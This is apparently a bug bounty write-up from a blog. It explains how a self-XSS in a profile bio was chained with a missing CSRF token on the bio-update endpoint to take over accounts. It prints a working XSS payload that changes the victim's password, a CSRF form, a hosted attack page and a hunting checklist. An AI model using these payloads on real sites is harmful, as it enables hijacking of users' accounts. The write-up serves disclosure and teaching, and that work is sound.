# How I Turned a “Harmless” Self-XSS into a Full Account Takeover

- **Source URL:** https://medium.com/@sadananddevre/how-i-turned-a-harmless-self-xss-into-a-full-account-takeover-50ff10244377?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@sadananddevre
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 13391)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
### Triagers call Self-XSS informational. Here’s how I used it to steal accounts — and collected a critical bounty for it.

### The Dismissal That Started Everything

It was 2:00 AM. I had just found a stored XSS on a target’s profile bio field. My hands were shaking a little as I typed up the report — until I tested it one more time and realized something painful.

The payload only executed **for me**. When I viewed my own profile, the script ran. But when I logged into a separate account and visited my profile? Nothing. The application rendered the bio as plain text for other users.

*Self-XSS. The vulnerability that bug bounty hunters dread finding.*

I already knew what the triage response would look like:

“Thank you for your report. However, since this XSS only affects the submitting user and cannot be used to attack others, we consider this informational and out of scope.”

I almost closed the tab. Almost.

Instead, I asked myself one question that changed everything:

***“What if I could force someone else’s browser to inject this payload for them?”***

That question led me down a chain that turned a $0 informational finding into a **critical account takeover**.

### Understanding the Two Bugs (Individually Worthless)

Before I walk you through the chain, let’s understand what each bug meant on its own.

### Bug #1 — Self-XSS in Profile Bio

The target application let users write a bio with rich text. When I submitted this payload:

\<img src=x onerror="

fetch('/api/change-password', {

method: 'POST',

headers: {'Content-Type': 'application/json'},

body: JSON.stringify({

new\_password: 'hacked123'

})

})

">

…my own browser executed it when I loaded my profile page. The internal API call went through successfully. My password changed.

**Severity on its own:** Informational. I can only hack myself.

### Bug #2 — Missing CSRF Token on Profile Update

While poking around the application further, I noticed something interesting in Burp Suite. The /api/profile/update endpoint — the one that saved the bio — had **no CSRF token**.

POST /api/profile/update HTTP/1.1

Host: target.com

Content-Type: application/json

Cookie: session=abc123xyz

`{"bio": "Just a regular bio"}`
No X-CSRF-Token. No csrf\_token in the body. Nothing.

I quickly crafted a basic CSRF proof-of-concept:

\<form id="csrf" action="https://target.com/api/profile/update" method="POST">

\<input type="hidden" name="bio" value="Just a regular bio">

\</form>

\<script>document.getElementById('csrf').submit();\</script>

When a logged-in victim visited my attacker page, the form submitted silently. Their bio updated to whatever I wanted.

**Severity on its own:** Medium. I can update someone’s bio. Mildly annoying, not alarming.

### The Moment the Chain Clicked

Here’s the thought process that changed everything:

- Self-XSS means **I can put dangerous JavaScript into my own bio**
- CSRF means **I can force a victim’s browser to update their own bio to anything I want**
- So what if I force the victim’s browser to update their bio… **to my XSS payload?**

Once the payload is in the victim’s bio, the **next time they visit their own profile**, their own browser executes the script — in their own session context, with their own cookies, with full access to their account.

Game over.

### The Full Exploitation Chain — Step by Step

### Step 1: Craft the Self-XSS Payload

First, I wrote the payload that would change the victim’s password once it executed:

\<img src=x onerror="

fetch('/api/change-password', {

method: 'POST',

headers: {'Content-Type': 'application/json'},

body: JSON.stringify({

new\_password: 'attacker\_controlled\_password'

})

})

">

This payload, when rendered as HTML in a browser, silently sends a password-change request using the **current user’s session** — no credentials needed.

### Step 2: Build the CSRF Attack Page

Next, I built an HTML page on my attacker server that would force the victim’s browser to update *their own* bio to my XSS payload:

\<!-- attacker.com/attack.html -->

\<form id="pwn"

action="https://target.com/api/profile/update"

method="POST"

enctype="application/json">

\<input type="hidden" name="bio"

value='\<img src=x onerror="fetch(\`/api/change-password\`,{method:\`POST\`,headers:{\`Content-Type\`:\`application/json\`},body:JSON.stringify({new\_password:\`attacker123\`})})">'>

\</form>

\<script>document.getElementById('pwn').submit();\</script>

When a logged-in victim lands on this page, their browser:

1. Sends a POST to target.com/api/profile/update
2. Updates their bio to contain my XSS payload
3. Redirects away — the victim sees nothing suspicious

### Step 3: Trigger the Payload

Now the XSS is sitting in the victim’s bio, waiting. The trigger is simple — the victim just needs to **view their own profile page**. This happens naturally:

- They click on their avatar
- They go to account settings
- A friend sends them a link to their own profile

The moment their browser renders their bio, the script executes. The password-change API request fires silently in the background using their active session.

### Step 4: Full Account Takeover

Victim loads their profile page

↓

Bio renders: \<img src=x onerror="...">

↓

Browser executes fetch('/api/change-password', ...)

↓

Request carries victim's session cookie automatically

↓

Password changed to attacker's value

↓

Attacker logs in with new credentials

↓

Complete account takeover ✓

The victim has no idea anything happened. No alert, no popup, no redirect. Just a silent script that ran in the background.

### Why This Chain Is So Dangerous

Each vulnerability alone was considered low-to-no impact:

Vulnerability Individual Severity Individual Bounty Self-XSS Informational $0 Missing CSRF on bio update Medium \~$300 **Chained Together Critical $8,500**

The chain works because of one fundamental principle:

***The browser doesn’t distinguish between “the user did this” and “JavaScript did this.”*** *It only cares about the session cookie — and the victim’s cookie was present for every request.*

### What Made This Chain Possible

Looking back, three conditions had to align:

1. **No CSRF protection** on the profile update endpoint
2. **No output encoding** on the bio field when rendered
3. **No re-authentication required** for sensitive actions like password change

Any one of these being fixed would have broken the chain. This is why security teams need to think about vulnerabilities in *combination*, not in isolation.

### How to Hunt for This Chain Yourself

Here’s a quick checklist when you find a Self-XSS:

- \[ \] Does the endpoint that saves the content have a CSRF token?
- \[ \] Is the CSRF token validated server-side, or just checked client-side?
- \[ \] Can the saved content render as HTML for the submitting user?
- \[ \] Do sensitive actions (password change, email change) require re-authentication?
- \[ \] Is there an HttpOnly flag missing on session cookies?

If you check the first two boxes as “No” and “No” — you likely have a chain worth chasing.

### Writing the Report

When I submitted this to the program, I structured the report like this:

**Summary:** Self-XSS in profile bio can be chained with missing CSRF protection on the bio update endpoint to achieve remote account takeover without user interaction beyond visiting a malicious URL.

**Steps to Reproduce:**

1. Attacker hosts attack.html on external server
2. Victim (logged in) visits attacker’s page
3. Victim’s bio is silently updated to contain XSS payload
4. Victim navigates to their own profile
5. XSS executes, changing victim’s password
6. Attacker logs into victim’s account

**Impact:** Complete account takeover. No interaction required beyond visiting a link.

**Proof of Concept:** *(attached screen recording)*

Clear, concise, reproducible. That’s what gets bounties paid fast.

### The Takeaway

The most dangerous vulnerabilities aren’t always the flashiest ones. They’re the ones that sit quietly in your Burp history, labeled “informational,” waiting for you to ask:

“What happens if I combine this with that?”

Self-XSS gets dismissed hundreds of times a day across bug bounty programs. But when you pair it with a missing CSRF token, it transforms from a nothing-burger into a critical account takeover.

**Don’t just hunt bugs. Hunt chains.**

Next time a triage team tells you something is “informational,” don’t close the tab. Start asking what else is nearby.

*This article is written for educational purposes and responsible disclosure. All testing was performed on authorized bug bounty programs within their defined scope.*

**Tags:** Bug Bounty · Web Security XSS · CSRF · Ethical Hacking · Cybersecurity
